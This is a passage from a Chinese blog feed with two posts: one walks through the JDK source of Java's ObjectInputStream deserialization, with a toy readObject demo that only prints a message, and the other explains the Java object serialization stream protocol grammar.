descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后将<code>descriptor</code>作为结果返回给<code>readOrdinaryObject</code>方法，赋值给desc；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">  Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>到目前为止，我们拿到了类描述符号desc，继续走readOrdinaryObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 拿到类描述符</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  <span class="comment">//检查是否可以反序列化</span></span><br><span class="line">    desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> </span>== Class<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">            || <span class="title">cl</span> </span>== ObjectStreamClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">  <span class="comment">//判断有无异常信息</span></span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//读取序列化数据，给字段赋值</span></span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 处理handles的赋值</span></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        Object rep = desc.invokeReadResolve(obj);</span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// Filter the replacement object</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="readSerialData"><a href="#readSerialData" class="headerlink" title="readSerialData"></a>readSerialData</h3><p>这里才是真正的开始序列化对象的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//从父类开始</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                SerialCallbackContext oldContext = curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                  <span class="comment">// 如果有readObject方法,执行</span></span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * In most cases, the handle table has already</span></span><br><span class="line"><span class="comment">                     * propagated a CNFException to passHandle at this</span></span><br><span class="line"><span class="comment">                     * point; this mark call is included to address cases</span></span><br><span class="line"><span class="comment">                     * where the custom readObject method has cons'ed and</span></span><br><span class="line"><span class="comment">                     * thrown a new CNFException of its own.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    handles.markException(passHandle, ex);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            curContext.setUsed();</span><br><span class="line">                            <span class="keyword">if</span> (oldContext!= <span class="keyword">null</span>)</span><br><span class="line">                                oldContext.check();</span><br><span class="line">                            curContext = oldContext;</span><br><span class="line">                            reset = <span class="keyword">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ThreadDeath x) &#123;</span><br><span class="line">                            t = x;  <span class="comment">// defer until reset is true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!reset);</span><br><span class="line">                    <span class="keyword">if</span> (t != <span class="keyword">null</span>)</span><br><span class="line">                        <span class="keyword">throw</span> t;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * defaultDataEnd may have been set indirectly by custom</span></span><br><span class="line"><span class="comment">                 * readObject() method when calling defaultReadObject() or</span></span><br><span class="line"><span class="comment">                 * readFields(); clear it to restore normal read behavior.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                defaultDataEnd = <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// 如果没有的话就执行默认的反序列化，给字段赋值</span></span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                skipCustomData();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="keyword">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>执行结束之后就会返回一个对象obj，这个类就是序列化好的对象</p><p>回到<code>readObject</code>方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210717150734443.png" alt="image-20210717150734443" style="zoom:50%;"><p>在反序列执行完成过后，它会调用<code>vlist</code>成员的<code>doCallbacks</code>来执行完成过后的回调逻辑，然后结束所有的序列化流程。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>还是Student那个例子我们插入一个readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"You are hacked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">        Student o = (Student)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210717152451921.png" alt="image-20210717152451921" style="zoom:50%;"><p>也就是说，我们需要反序列化出来的对象是Student，正好我们本地有，又因为有readObject方法，于是就直接从当前流中取出对象，执行了这个方法。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>步骤</p><ul><li>首先拿到desc</li><li>如果有readObject方法，用反射执行</li><li>没有的话给对象字段赋值</li><li>序列化对象成功</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;梳理Java反序列化流程。&lt;/p&gt;
&lt;p&gt;参考&lt;a href=&quot;https://www.cnpanda.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;panda&lt;/a&gt;师傅。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java对象序列化流协议梳理</title>
    <link href="https://0range228.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/"/>
    <id>https://0range228.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-16T07:27:51.000Z</published>
    <updated>2021-07-17T07:38:31.580Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>协议原文<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></p><a id="more"></a><h1 id="stream流元素"><a href="#stream流元素" class="headerlink" title="stream流元素"></a>stream流元素</h1><p>stream，流元素，就是用来表示流中的对象。</p><p>现在在我们流中的每一个对象都需要表示，比如对象的类和类中的field字段。</p><p>流中对象的表示可以用语法来描述:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> objects</span><br><span class="line">new objects</span><br><span class="line">classes</span><br><span class="line"><span class="built_in">array</span>s</span><br><span class="line"><span class="built_in">string</span>s</span><br><span class="line">handles (句柄，流中对象的方向引用)</span><br><span class="line">这个句柄从 <span class="number">0x7E0000</span> 开始按顺序分配句柄。当流重置时，句柄在 <span class="number">0x7E0000</span> 处重新启动。</span><br></pre></td></tr></table></figure><p>stream中对象基本结构：</p><p><strong>类对象由的<code>ObjectStreamClass</code>对象表示</strong></p><p>非动态代理类对象的<code>ObjectStreamClass</code>由以下成分组成：</p><ul><li>兼容类的流唯一标识符 (SUID)</li><li>一组指示类的各种属性的标志，例如该类是否定义了<code>writeObject</code>方法，以及该类是否可序列化、可外部化或枚举类型</li><li>可序列化字段的个数</li><li>默认情况下，对于类的字段数组和对象字段来说，字段的类型要作为字符串被包含，字段描述符格式<code>Ljava/lang/Object;</code></li><li>由<code>annotateClass</code>方法写入的可选数据块</li><li>该对象父类的<code>ObjectStreamClass</code> ，如果父类不可序列化，该字段则为null</li></ul><p>动态代理类对象的<code>ObjectStreamClass</code>由以下成分组成：</p><ul><li>动态代理类实现的接口数量</li><li>动态代理类实现的所有接口名称，这些借口通过调用Class的<code>getINterfaces</code>方法的返回结果进行排序列出</li><li>由<code>annotateProxyClass</code> 方法写入的可选块数据记录或对象</li><li>父类对应的<code>ObjectStreamClass</code>和<code>java.lang.reflect.Proxy</code></li></ul><p>数组对象由以下成分组成：</p><ul><li>他们的 <code>ObjectStreamClass</code>对象。</li><li>元素的数量。</li><li>值的序列。值的类型在数组的类型中是隐式的。例如，字节数组的值是byte类型。</li></ul><p>Enum枚举类型:</p><ul><li>常量的基本枚举类型的<code>ObjectStreamClass</code>对象。</li><li>常量的名称字符串。</li></ul><p>流中的新对象<code>new Objects</code>由以下成组成：</p><ul><li><p>所有对象类的派生类信息</p></li><li><p>对象的每一个可序列化类的数据，从最上面的父类开始写入。</p><p>对于每个类，流包含以下内容：</p><ul><li>可序列化字段：</li><li>如果类有<code>writeObject/readObject</code>方法，那么有可能出现通过<code>writeObject</code>方法写入的可选对象或者基础类型的数据块<code>Data-Block</code>，跟着使用<code>endDataBlock方法</code></li></ul></li></ul><p>备注：</p><p>所有由类写入的原始数据都被缓冲并包裹在块数据记录中，无论数据是在writeObject方法中写入流中，还是在writeObject方法之外直接写入流中。<strong>这些数据只能被相应的readObject方法读取或直接从流中读取。</strong>由writeObject方法写入的对象会终止之前的任何块数据记录，并根据情况被写成普通对象或空或反向引用。块数据记录允许错误恢复以丢弃任何可选数据。</p><p>当从一个类中调用时，流可以丢弃任何数据或对象，直到遇到endBlockData。</p><h1 id="序列化流格式"><a href="#序列化流格式" class="headerlink" title="序列化流格式"></a>序列化流格式</h1><p>现在我们可以在对象流中随便抓一个stream。自顶向下解析它。</p><h2 id="stream"><a href="#stream" class="headerlink" title="stream"></a>stream</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stream:</span><br><span class="line">magic version contents</span><br></pre></td></tr></table></figure><p>每个stream对象都是由三部分组成：</p><ul><li>magic : 魔数 <code>STREAM_MAGIC</code> 常量类型 表示内容类型</li><li>version：jdk版本号 <code>STREAM_VERSION</code> 常量类型</li><li>contents ：流对象内容</li></ul><p><code>STREAM_MAGIC</code>与<code>STREAM_VERSION</code>等常量值都在ObjectStreamConstants接口中定义。</p><h2 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contents:</span><br><span class="line">  content</span><br><span class="line">  contents content</span><br></pre></td></tr></table></figure><p>类似CFL，流中contents可以由一个content组成，也可以由多个contents组成</p><h2 id="content"><a href="#content" class="headerlink" title="content"></a>content</h2><p>这里以一个content为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content:</span><br><span class="line">  object</span><br><span class="line">  blockdata</span><br></pre></td></tr></table></figure><p>一个content可以是一个对象(object)，也可以是一个块数据(blockdata)。block在下面会详细说。</p><h2 id="object"><a href="#object" class="headerlink" title="object"></a>object</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">object:</span><br><span class="line">  newObject</span><br><span class="line">  newClass</span><br><span class="line">  newArray</span><br><span class="line">  newString</span><br><span class="line">  newEnum</span><br><span class="line">  newClassDesc</span><br><span class="line">  prevObject</span><br><span class="line">  nullReference</span><br><span class="line">  exception</span><br><span class="line">  TC_RESET</span><br></pre></td></tr></table></figure><p>对象序列化流中的”对象”与Java中的对象概念有些不一样。对象序列化流中的”对象”分为上面那些种，最常见的是newObject、newString、newClassDesc。</p><ul><li><p>newClassDesc表示ObjectStreamClass类的对象，可以简单理解为类的描述符。</p></li><li><p>newClass表示Class类对象，如person.class对象，就是Class类的一个实例对象。</p></li><li><p>newObject表示一个普通的对象，如果一个对象不是其他几种类型的对象（如newString、newClassDesc、newClass等），就归到newObject，如person对象。</p></li></ul><p>接下来也是按照这个顺序解析：</p><h3 id="newClassDesc"><a href="#newClassDesc" class="headerlink" title="newClassDesc"></a>newClassDesc</h3><p>表示是一个类描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newClassDesc:</span><br><span class="line">  TC_CLASSDESC className serialVersionUID newHandle classDescInfo</span><br><span class="line">  TC_PROXYCLASSDESC newHandle proxyClassDescInfo</span><br></pre></td></tr></table></figure><p>这里列出来了两种类描述符种类：</p><ul><li><p>一般正常的类描述符（主流）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TC_CLASSDESC className serialVersionUID newHandle classDescInfo</span><br></pre></td></tr></table></figure><p>TC_CLASSDESC：类描述符的开始标志</p><p>className：类名</p><p>serialVersionUID：序列化ID</p><p>newHandleL：新的引用</p><p>classDescInfo：类信息</p></li><li><p>动态代理类的类描述符</p></li></ul><h3 id="newObject"><a href="#newObject" class="headerlink" title="newObject"></a>newObject</h3><p>表示该部分是一个新的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newObject:</span><br><span class="line">  TC_OBJECT classDesc newHandle classdata[]  <span class="comment">// data for each class</span></span><br></pre></td></tr></table></figure><p>TC_OBJECT：常量，表示接下来是一个一个序列化Object的开始标志。</p><p>classDesc：当前这个对象的类描述符，里面存放的是类信息，字段信息。</p><p>newHandle：当前这个对象的引用句柄。</p><p>classData[]：这个对象对应的每一个Class的相关数据信息。这部分在下面会详细说</p><h3 id="newClass"><a href="#newClass" class="headerlink" title="newClass"></a>newClass</h3><p>表示该部分是一个新的Class类型的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">newClass:</span><br><span class="line">  TC_CLASS classDesc newHandle</span><br></pre></td></tr></table></figure><p>TC_CLASS：类型标记，表示接下来是一个序列化Class类型的对象。</p><p>classDesc：表示这个Class对象的类描述符。</p><p>newHandle： 新的引用。</p><h3 id="classDesc"><a href="#classDesc" class="headerlink" title="classDesc"></a>classDesc</h3><p>表示一个对象的类描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">classDesc:</span><br><span class="line">  newClassDesc</span><br><span class="line">  nullReference</span><br><span class="line">  (ClassDesc)prevObject      <span class="comment">// an object required to be of type</span></span><br><span class="line">                             <span class="comment">// ClassDesc</span></span><br></pre></td></tr></table></figure><p>newClassDesc：对象的类描述符</p><p>nullReference：空引用</p><p>(ClassDesc)prevObject ：表示前面出现过的对象（<em>要求为ClassDesc类型的对象</em>）</p><h3 id="superClassDesc"><a href="#superClassDesc" class="headerlink" title="superClassDesc"></a>superClassDesc</h3><p>表示父类的描述符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">superClassDesc:</span><br><span class="line">  classDesc</span><br></pre></td></tr></table></figure><p>如果被序列化对象的类，如果其父类没有实现Serializable接口，这个地方就是TC_NULL，表示空对象。</p><p>如果其父类实现了实现了Serializable接口，那此处会写入其父类对应的ObjectStreamClass对象，父类描述符。</p><h3 id="classDescInfo"><a href="#classDescInfo" class="headerlink" title="classDescInfo"></a>classDescInfo</h3><p>表示是详细的类描述信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">classDescInfo:</span><br><span class="line">  classDescFlags fields classAnnotation superClassDesc</span><br></pre></td></tr></table></figure><p>classDescFlags：类描述信息标记</p><p>fields ：类中所有字段的描述信息</p><p>classAnnotation ：和类相关的Annotation的描述信息</p><p>superClassDesc：该类的父类的描述信息</p><h3 id="proxyInterface"><a href="#proxyInterface" class="headerlink" title="proxyInterface"></a>proxyInterface</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxyInterfaceName:</span><br><span class="line">  (utf)</span><br></pre></td></tr></table></figure><p>动态代理类的代理接口的名称，一个UTF-8格式的字符串对应的二进制序列；</p><h3 id="proxyClassDescInfo"><a href="#proxyClassDescInfo" class="headerlink" title="proxyClassDescInfo"></a>proxyClassDescInfo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxyClassDescInfo:</span><br><span class="line">  (<span class="keyword">int</span>)&lt;count&gt; proxyInterfaceName[count] classAnnotation</span><br><span class="line">      superClassDesc</span><br></pre></td></tr></table></figure><p>动态代理类的相关描述信息</p><p><code>&lt;count&gt;</code>表示该动态代理类实现的接口总数，类型为int类型</p><p>proxyInterfaceName[count]表示所有当前动态代理类实现的接口信息</p><p>classAnnotation表示该动态代理类对应的Annotation的描述信息</p><p>superClassDesc表示当前动态代理类的父类的类描述信息</p><h3 id="fields"><a href="#fields" class="headerlink" title="fields"></a>fields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 